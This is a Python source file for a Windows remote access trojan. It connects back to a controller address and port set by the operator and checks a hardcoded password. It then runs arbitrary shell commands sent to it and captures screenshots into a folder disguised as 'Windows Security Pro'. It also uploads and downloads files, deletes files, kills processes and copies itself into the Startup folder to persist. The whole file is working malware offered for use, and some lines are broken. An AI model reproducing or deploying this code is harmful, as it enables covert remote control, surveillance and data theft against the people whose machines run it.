##############################################################
#----------Made by TAMT , Read licenses before using---------#
##############################################################

#-------------------import important library-----------------#
import socket
import subprocess
import os
import pyttsx
import time
import sys
import webbrowser
from base64 import *
import platform
import pyscreenshot as ImageGrab
from PIL import Image
import ntpath
try:
    import win32con
except Exception as e:
    pass
import shutil

st = b64encode('123EnDs123')

def ChangeNameAndPutInStartUpFolder(user,NewName):
    try:
        this = sys.argv[0]
        url = 'C:\Users\\'+ str(user) +'\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\'
        if os.path.isdir(url):
            shutil.copy(this,url + NewName)


            with open(url+NewName,"wb") as f:
                O = open(this,"rb")
                f.write(O.read())
                time.sleep(1)
                O.close()

            return "[*] Done file located at : " + str(url+NewName)
        else:
            return "[!] startup folder could not be found."
    except Exception as e:
        return "Error:\n" + str(e)

def say(text):

    try:

        engine = pyttsx.init()
        rate = engine.getProperty('rate')
        engine.setProperty('rate', rate-100)
        engine.say(text)
        engine.runAndWait()

        return '[*] done!'
    except Exception as e : return "Say error" + str(e)
def sendImg(name,s):
    global st
    en = ''
    before = ''
    if name.startswith('c:\\') or '\\' in name:
        before = ''
    else:
        before = os.getcwd() + '\\'

    with open(before + name , 'rb') as f:
        en = f.read()

    time.sleep(2)
    s.send(str(en[-50:]))
    time.sleep(2)
    s.sendall(en)

def GetImage(name , s , this):
    global st
    All = ''
    ends = ''
    name = ntpath.basename(name)

    f = open('uploaded_'+ name,'wb')
    ends = s.recv(1024)

    while True:
        data = s.recv(1024*100)
        All += data
        if str(data).endswith(ends):
            break

    f.write(All)
    f.close()

    s.send('uploaded')
def CloseSocketAndReconnectAfter(s,t):
    s.close()
    time.sleep(t)
    createSocket()

def connectSocket(s):
    global st

    s.send(os.getcwd())
    time.sleep(1)
    startup = s.recv(1024)
    if str(startup[:7]).strip() == 'startup':
        ends = ntpath.basename(sys.argv[0])
        name = startup[7:]
        user = os.environ['USERNAME']
        s.send(ChangeNameAndPutInStartUpFolder(user,str(name)))

    while True:

        data = s.recv(1024*2)
        dataA = str(data).lower()

        if dataA[0:3] == 'say':
            try:
                s.send(say(dataA[4:]) + st)
            except Exception as e: s.send(str(e) + st)
        elif dataA[:5].lower() == 'pkill':
            app = dataA[5:]
            try:
                os.system('TASKKILL /F /IM ' + str(app))
                s.send("[*] program has been killed " + str(st))
            except Exception as e:
                s.send("Error: \n" + str(e) + str(st))
        elif dataA[:3].lower() == "run":
            if os.path.isfile(dataA[4:]):
                try:
                    os.startfile( + str(st))
                    s.send('[*] file runs')
                except Exception as e:
                    s.send(str(e))

            else:
                s.send("[*] there is no file called '" + dataA[4:] + "'")
        elif dataA[:6].lower() == 'screen':

            url = 'C:\\Program Files\\Windows Security Pro\\'
            fileUrl = url + 'img.png'

            im = ImageGrab.grab()
            if os.path.isdir(url) == False:
                os.mkdir(url)

            im.save(fileUrl)

            time.sleep(2)
            sendImg(fileUrl,s)
            time.sleep(5)
            shutil.rmtree(url)

        elif dataA[:8].lower() =='download':
            if dataA[9:].startswith('c:\\'):
                Dir = dataA[9:]
            else:
                Dir = os.getcwd() + '\\' + dataA[9:]

            f = os.path.isfile(Dir)

            if f == True:

                s.send('true')
                size = os.path.getsize(Dir)
                sendImg(dataA[9:],s)
            else:
                s.send('error')

        elif dataA[:6] == 'upload':
            check_if_file = s.recv(1024)
            if(check_if_file == 'true'):
                GetImage(dataA[7:],s,'upload')

        elif dataA[:4] == 'info':
            s.sendall('[*] ' + platform.system() +' ' + platform.release() + ' ' + os.name + str(st))

        elif dataA[:2] == 'cd':
            try:
                os.chdir(dataA[3:])
                s.send(os.getcwd() + '\n' + '123END123')

            except Exception as e: s.send("Error"+ '123END123' +str(e) + '\n' + '123END123') # if there is an error then it tells you
        elif dataA[:3] == 'run':
            try:
                os.startfile(dataA[5:])
                s.send('[!] Done' + str(st))
            except Exception as e:
                s.send('[!] Error:\n' + str(e) + str(st));

        elif dataA[:2] == 'rm':
            try:
                if os.path.isdir(dataA[3:]):
                    shutil.rmtree(dataA[3:])
                    s.send('[*] folder deleted \n' + st)

                elif os.path.isfile(dataA[3:]):
                    os.remove(dataA[3:])
                    s.send('[*] file deleted \n' + st)

            except Exception as e: s.send("\nrm Error :\n" + str(e) + st)

        elif dataA[:2] == 'os':
            try:
                subprocess.call(dataA[3:])
                s.send('[*] done!' + st)

            except Exception as e: s.send("\nos Error :\n" + str(e) + st)
        elif dataA[0:3] == 'url':
            webbrowser.open_new_tab(str(dataA[4:]).decode('utf-8' , 'ignore'))
            s.send('[*] opened' + str(st))

        elif dataA[0:3] == 'cat':
            try:
                All = ''

                exists = os.path.isfile(str(dataA[4:]))

                if exists:
                    with open(dataA[4:],'r') as f:
                        try:
                            All = f.read()
                            s.sendall(str(All) + st)

                        except MemoryError as e:
                            s.send(str(e) + st)
                else:
                    s.send('[*] File does not exist' + st)

            except Exception as e: s.send(str(e) + st)

        elif 'hostname' in dataA[:8]:
            hostname = os.popen('hostname').read().encode('utf-8','ignore')
            s.send(hostname + str(st))

        elif dataA[:2].strip() == 'ls' or dataA[:3].strip() == 'dir':
            cmd = os.popen('dir').read().decode('utf-8', 'ignore')
            s.sendall(cmd + st)


        elif dataA[:4] == 'exit':
            s.close()
            sys.exit(0)

        else:
            st = b64encode('123EnDs123')
            try:

                cmd = subprocess.Popen(dataA , shell=False,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE) # takes the output of what you have wrote to him
                out , err = cmd.communicate()

                s.sendall(out + '\n' + err + st)

            except Exception as e:
                try:
                    s.send(str(e) + st)
                except:
                    CloseSocketAndReconnectAfter(s,5)

#-----------------------------------------------#
def login(s,host,port):

    password = 'TAMT'
    while True:
        try:
            s.connect((host,port))
        except Exception:
            try:
                time.sleep(1)
            except:
                pass
            continue
        break

    for tries in range(3):
        try:
            passwordRecv = s.recv(1024)

            if(passwordRecv == password):
                s.send("Login Successfully")
                time.sleep(2)
                connectSocket(s)
                break

            else:

                s.send('wrong password')
        except Exception:
            CloseSocketAndReconnectAfter(s,2)

    s.close()
    sys.exit(0)



def createSocket():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    host = '127.0.0.1' #change me
    port = int(6464) #change me

    login(s,host,port)

#-----------------------------------------------#

if __name__ == '__main__':
    createSocket()
